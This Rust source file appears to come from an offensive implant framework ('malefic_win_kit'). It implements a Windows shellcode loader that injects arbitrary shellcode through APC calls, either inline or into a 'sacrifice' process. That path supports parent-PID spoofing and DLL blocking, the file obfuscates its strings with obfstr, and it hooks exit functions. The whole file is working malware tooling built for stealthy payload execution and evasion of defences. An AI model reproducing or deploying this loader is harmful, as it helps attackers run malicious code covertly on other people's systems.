use std::{ffi::CString, ptr::null_mut};
use detour::static_detour;
use obfstr::obfstr;

type ExitFn = unsafe extern "C" fn(i32);

static_detour! {
    static ExitFnDetour: unsafe extern "C" fn(i32);
    static ExitThreadFnDetour: unsafe extern "C" fn(i32);
}

#[cfg(feature = "prebuild")]
pub unsafe fn loader(bin: Vec<u8>, is_need_sacrifice: bool, sacrifice_commandline: *mut i8, ppid: u32, block_dll: bool) -> Result<Vec<u8>, String> {
    use crate::win::kit::{ApcLoaderInline, ApcLoaderSacriface, MExitThread};
    if bin.is_empty() {
        return Err(obfstr!("empty shellcode").to_string());
    }
    if is_need_sacrifice {
        let ret = ApcLoaderSacriface(bin.as_ptr(), bin.len(), sacrifice_commandline, ppid, block_dll);
        if ret.is_null() {
            return Err(obfstr!("Apc Loader Sacrifice failed!").to_string());
        }
        let ret_s = CString::from_raw(ret as _).to_string_lossy().to_string();
        let ret_vec = ret_s.into_bytes();
        return Ok(ret_vec);
    }
    let ret = ApcLoaderInline(bin.as_ptr(), bin.len());
    if ret.is_null() {
        return Err(obfstr!("Apc Loader Sacrifice failed!").to_string());
    }
    let ret_s = CString::from_raw(ret as _).to_string_lossy().to_string();
    let ret_vec = ret_s.into_bytes();
    // let _ = ExitFnDetour.disable();
    return Ok(ret_vec);

}

#[cfg(feature = "source")]
pub unsafe fn loader(bin: Vec<u8>, is_need_sacrifice: bool, sacrifice_commandline: *mut i8, ppid: u32, block_dll: bool) -> Result<Vec<u8>, String> {
    use malefic_win_kit::dynamic::RunShellcode::{inline_apc_loader, sacriface_apc_loader};
    use malefic_win_kit::apis::DynamicApis::EXIT_THREAD;
    if bin.is_empty() {
        return Err(obfstr!("empty shellcode").to_string());
    }
    if is_need_sacrifice {
        return sacriface_apc_loader(bin, sacrifice_commandline, ppid, block_dll);
    }
    let ret = inline_apc_loader(bin);
    return ret;
}